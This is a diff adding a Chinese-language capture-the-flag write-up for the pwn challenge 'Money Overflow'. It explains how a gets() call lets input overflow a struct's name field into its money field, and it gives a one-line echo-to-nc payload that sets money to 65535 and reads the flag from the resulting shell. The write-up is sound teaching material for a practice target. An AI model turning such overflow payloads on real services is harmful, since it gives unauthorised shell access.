@@ -1,0 +1,49 @@
+---
+title: Money Overflow
+date: 2025-04-22 02:45:00
+description: Overwriting a neighboring struct field through an unsafe read.
+order: 2
+draft: false
+---
+
+import ChallengeInfo from '@/components/ChallengeInfo.astro'
+
+<ChallengeInfo
+  author="Dr.dog"
+  category="pwn"
+  description="I'm so poor that I can't afford to eat. I really wish I had a rich little sister to save me QQ"
+  remote="nc chal.ctf.scint.org 10001"
+  files={[
+    {
+      label: 'money_overflow.c',
+      href: 'https://github.com/yuto0226/notes/blob/main/public/thjcc-ctf-pwn/money_overflow.c',
+    },
+  ]}
+/>
+
+## Solution
+
+這題就是簡單的 stack overflow 題，使用者的資訊會被存在一個 `struct` 裡面：
+
+```c
+struct {
+  int id;
+  char name[20];
+  unsigned short money;
+} customer;
+```
+
+而程式一開始就用不安全的函式讀，取使用者的輸入到 `customer.name`。這就給了我們利用的機會，只要填滿 `name` 後，就可以覆蓋到 `money` 的值。
+
+```c
+customer.id = 1;
+customer.money = 100;
+printf("Enter your name: ");
+gets(customer.name);
+```
+
+而題目要求要 65535 才能拿到 shell，因此只要蓋 `\xff\xff` 就可以了。
+
+```zsh
+echo -e 'AAAAAAAAAAAAAAAAAAAA\xff\xff\n5\ncat flag.txt' | nc chal.ctf.scint.org 10001
+```
